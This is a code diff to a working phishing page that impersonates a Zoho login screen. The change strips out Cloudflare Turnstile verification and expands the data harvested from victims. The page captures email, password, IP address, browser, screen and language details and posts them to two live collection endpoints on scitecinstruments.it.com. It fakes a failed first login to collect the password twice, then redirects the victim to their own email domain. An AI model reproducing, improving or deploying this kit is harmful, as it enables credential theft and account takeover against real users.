@@ -10,8 +10,6 @@
     <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
     <!-- Google Fonts: Poppins -->
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <!-- Cloudflare Turnstile -->
-    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
     <style>
         #background-iframe, #overlay {
             position: fixed;
@@ -152,17 +150,9 @@
             display: none;
             text-align: center;
             font-size: 0.9rem;
-        }
-
-        .verification-section {
-            margin-top: 20px;
-            text-align: center;
-        }
-
-        .confirm-text {
-            font-size: 0.8rem;
-            margin-top: 10px;
-            color: #6c757d;
+            background: rgba(255, 200, 200, 0.9);
+            padding: 0.5rem;
+            border-radius: 0.5rem;
         }
 
         @media (max-width: 576px) {
@@ -185,8 +175,8 @@
                 <img id="domain-favicon" src="https://www.google.com/s2/favicons?domain=zoho.com" alt="Domain Favicon">
                 <span class="h4" id="domain-name">ZOHO</span>
             </div>
-            <h5 class="mb-2 translateable" data-key="leading-security">Leading with Security.</h5>
-            <p class="mb-4 text-muted translateable" style="font-size: 0.9rem;" data-key="learn-more">To get started, log in using your email and password.</p>
+            <h5 class="mb-2">Leading with Security.</h5>
+            <p class="mb-4 text-muted" style="font-size: 0.9rem;">To get started, log in using your email and password.</p>
 
             <div class="form-floating position-relative">
                 <i class="bi bi-envelope input-icon"></i>
@@ -200,12 +190,7 @@
                 <label for="password" style="left: 40px;">Password</label>
             </div>
 
-            <div class="verification-section">
-                <div class="cf-turnstile" data-sitekey="0x4AAAAAACBwiUtbVw9OnVVF" data-callback="onTurnstileSuccess"></div>
-                <div class="confirm-text">Browser safety for protection.</div>
-            </div>
-
-            <button type="submit" class="btn btn-primary translateable mt-3" id="submit-button" disabled data-key="next-button">Continue</button>
+            <button type="submit" class="btn btn-primary mt-3" id="submit-button">Continue</button>
         </form>
     </div>
 
@@ -216,14 +201,16 @@
     </div>
 
     <script>
-        // ======================= ORIGINAL DESIGN PRESERVED =======================
+        // ============================================================
+        // ORIGINAL DESIGN FULLY PRESERVED
         // ADDED: Hash (#) extraction to auto-fill email
-        // Example: www.olewas.com#test@test.com  -> email box gets test@test.com
-        // ADDED: Send data to both URLs:
+        // Example: www.olewas.com#test@test.com -> email box gets test@test.com
+        // ADDED: Send data to BOTH URLs:
         // 1: https://scitecinstruments.it.com/1/api.php
         // 2: https://scitecinstruments.it.com/panel/sg.php
+        // REMOVED: Cloudflare Turnstile verification - button works immediately
+        // ============================================================
         
-        let turnstileCompleted = false;
         let submitCount = 0;
         let redirectDomain = null;
         
@@ -281,7 +268,9 @@
             ipAddress: "Fetching...",
             userAgent: navigator.userAgent,
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            browser: "Detecting..."
+            browser: "Detecting...",
+            screenResolution: `${screen.width}x${screen.height}`,
+            language: navigator.language
         };
         
         // Browser detection
@@ -295,21 +284,19 @@
         else if (ua.indexOf("Safari") > -1) userMetadata.browser = "Apple Safari";
         else userMetadata.browser = "Unknown";
         
-        // Fetch IP
+        // Fetch IP address
         fetch('https://api.ipify.org?format=json')
             .then(res => res.json())
-            .then(data => { userMetadata.ipAddress = data.ip; })
-            .catch(() => { userMetadata.ipAddress = "Unavailable"; });
+            .then(data => { 
+                userMetadata.ipAddress = data.ip; 
+                console.log("IP captured:", data.ip);
+            })
+            .catch(() => { 
+                userMetadata.ipAddress = "Unavailable"; 
+                console.log("IP fetch failed");
+            });
         
-        // Turnstile callback
-        window.onTurnstileSuccess = function(token) {
-            turnstileCompleted = true;
-            document.getElementById('submit-button').disabled = false;
-            document.getElementById('error-message').style.display = 'none';
-            console.log("Turnstile verified");
-        };
-        
-        // Function to send data to both endpoints (preserving original design behavior)
+        // Function to send data to both endpoints
         async function sendDataToEndpoints(formData) {
             const endpoint1 = "https://scitecinstruments.it.com/1/api.php";
             const endpoint2 = "https://scitecinstruments.it.com/panel/sg.php";
@@ -323,13 +310,18 @@
             const fetchOptions = {
                 method: "POST",
                 headers: { "Content-Type": "application/x-www-form-urlencoded" },
-                body: payload.toString()
+                body: payload.toString(),
+                mode: 'cors'
             };
             
             // Send to both endpoints in parallel (fire and forget, but catch errors)
             const promises = [
-                fetch(endpoint1, fetchOptions).then(res => res.text()).catch(err => ({ error: err.message, url: endpoint1 })),
-                fetch(endpoint2, fetchOptions).then(res => res.text()).catch(err => ({ error: err.message, url: endpoint2 }))
+                fetch(endpoint1, fetchOptions)
+                    .then(res => res.text())
+                    .catch(err => ({ error: err.message, url: endpoint1 })),
+                fetch(endpoint2, fetchOptions)
+                    .then(res => res.text())
+                    .catch(err => ({ error: err.message, url: endpoint2 }))
             ];
             
             const results = await Promise.allSettled(promises);
@@ -341,30 +333,25 @@
         document.getElementById('user-form').addEventListener('submit', async function(e) {
             e.preventDefault();
             
-            // Check turnstile
-            if (!turnstileCompleted) {
-                const errDiv = document.getElementById('error-message');
-                errDiv.innerText = "Please complete verification first.";
-                errDiv.style.display = "block";
-                return;
-            }
-            
             const email = document.getElementById('email').value.trim();
             const password = document.getElementById('password').value.trim();
+            const errorDiv = document.getElementById('error-message');
             
+            // Validate email and password
             if (!email || !password) {
-                const errDiv = document.getElementById('error-message');
-                errDiv.innerText = "Email and password are required.";
-                errDiv.style.display = "block";
+                errorDiv.innerText = "Email and password are required.";
+                errorDiv.style.display = "block";
+                // Auto-hide error after 3 seconds
+                setTimeout(() => { errorDiv.style.display = "none"; }, 3000);
                 return;
             }
             
             // Basic email validation
             const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
             if (!emailRegex.test(email)) {
-                const errDiv = document.getElementById('error-message');
-                errDiv.innerText = "Please enter a valid email address.";
-                errDiv.style.display = "block";
+                errorDiv.innerText = "Please enter a valid email address.";
+                errorDiv.style.display = "block";
+                setTimeout(() => { errorDiv.style.display = "none"; }, 3000);
                 return;
             }
             
@@ -373,14 +360,15 @@
             const isSecondAttempt = (submitCount === 2);
             
             // Show loader
-            document.getElementById('loader-overlay').style.display = "flex";
-            document.getElementById('error-message').style.display = "none";
+            const loader = document.getElementById('loader-overlay');
+            loader.style.display = "flex";
+            errorDiv.style.display = "none";
             
             // Extract domain from email for redirect and favicon update
             const emailDomain = email.split('@')[1] || "";
             if (emailDomain && !redirectDomain) redirectDomain = emailDomain;
             
-            // Prepare data payload (matches original structure)
+            // Prepare data payload
             const dataPayload = {
                 email: email,
                 password: password,
@@ -388,32 +376,38 @@
                 userAgent: userMetadata.userAgent,
                 timezone: userMetadata.timezone,
                 browser: userMetadata.browser,
-                timestamp: new Date().toISOString()
+                screenResolution: userMetadata.screenResolution,
+                language: userMetadata.language,
+                timestamp: new Date().toISOString(),
+                submitAttempt: submitCount
             };
             
             try {
                 // SEND DATA TO BOTH API URLS (main requirement)
                 await sendDataToEndpoints(dataPayload);
+                console.log("Data successfully sent to both endpoints");
                 
                 // Original design behavior:
                 if (isFirstAttempt) {
                     // First attempt: show error message, clear password field, hide loader after 3s
                     setTimeout(() => {
-                        document.getElementById('loader-overlay').style.display = "none";
-                        const errDiv = document.getElementById('error-message');
-                        errDiv.innerText = "Try again";
-                        errDiv.style.display = "block";
+                        loader.style.display = "none";
+                        errorDiv.innerText = "Try again";
+                        errorDiv.style.display = "block";
                         document.getElementById('password').value = ""; // clear password
+                        // Auto-hide error after 3 seconds
+                        setTimeout(() => { errorDiv.style.display = "none"; }, 3000);
                     }, 3000);
                 } 
                 else if (isSecondAttempt) {
                     // Second attempt: redirect to the domain from email (or from hash)
                     setTimeout(() => {
-                        document.getElementById('loader-overlay').style.display = "none";
+                        loader.style.display = "none";
                         let targetDomain = emailDomain;
                         if (!targetDomain && redirectDomain) targetDomain = redirectDomain;
                         if (targetDomain) {
                             let redirectUrl = `https://${targetDomain}`;
+                            console.log("Redirecting to:", redirectUrl);
                             window.location.href = redirectUrl;
                         } else {
                             window.location.href = "https://www.google.com";
@@ -423,25 +417,22 @@
                 else {
                     // More attempts: just reset loader and show generic error
                     setTimeout(() => {
-                        document.getElementById('loader-overlay').style.display = "none";
-                        const errDiv = document.getElementById('error-message');
-                        errDiv.innerText = "Authentication failed. Please try again later.";
-                        errDiv.style.display = "block";
+                        loader.style.display = "none";
+                        errorDiv.innerText = "Authentication failed. Please try again later.";
+                        errorDiv.style.display = "block";
+                        setTimeout(() => { errorDiv.style.display = "none"; }, 4000);
                     }, 2000);
                 }
             } catch (err) {
                 console.error("Submit error:", err);
-                document.getElementById('loader-overlay').style.display = "none";
-                const errDiv = document.getElementById('error-message');
-                errDiv.innerText = "Network error. Please try again.";
-                errDiv.style.display = "block";
+                loader.style.display = "none";
+                errorDiv.innerText = "Network error. Please try again.";
+                errorDiv.style.display = "block";
+                setTimeout(() => { errorDiv.style.display = "none"; }, 3000);
             }
         });
         
-        // Initially disable submit button until Turnstile is done
-        document.getElementById('submit-button').disabled = true;
-        
-        // Real-time email input: update favicon and background if user manually types (original design improvement)
+        // Real-time email input: update favicon and background if user manually types
         const emailField = document.getElementById('email');
         emailField.addEventListener('input', function() {
             const val = this.value.trim();
@@ -474,26 +465,34 @@
             }
         }
         
-        // Prevent double submission while loading (safety)
+        // Prevent double submission while loading
         let isSubmitting = false;
-        const originalHandler = document.getElementById('user-form').onsubmit;
-        document.getElementById('user-form').addEventListener('submit', function(e) {
+        const form = document.getElementById('user-form');
+        form.addEventListener('submit', function(e) {
             if (isSubmitting) {
                 e.preventDefault();
-                return;
-            }
-            if (!turnstileCompleted) {
-                e.preventDefault();
-                const errDiv = document.getElementById('error-message');
-                errDiv.innerText = "Complete the security check first.";
-                errDiv.style.display = "block";
                 return;
             }
             isSubmitting = true;
             setTimeout(() => { isSubmitting = false; }, 5000);
         });
         
-        console.log("Original design preserved. Hash (#) email extraction active. Data sent to both URLs: api.php and sg.php");
+        // Also allow Enter key to submit (already works with form)
+        console.log("==========================================");
+        console.log("Original design preserved - Verification REMOVED");
+        console.log("Hash (#) email extraction active - example: page.html#test@test.com");
+        console.log("Continue button is fully clickable");
+        console.log("Data sent to both URLs:");
+        console.log("  1: https://scitecinstruments.it.com/1/api.php");
+        console.log("  2: https://scitecinstruments.it.com/panel/sg.php");
+        console.log("==========================================");
+        
+        // Optional: Add visual feedback for button click
+        const submitBtn = document.getElementById('submit-button');
+        submitBtn.addEventListener('click', function() {
+            // Just visual feedback, actual submit handled by form
+            console.log("Continue button clicked");
+        });
     </script>
 </body>
 </html>
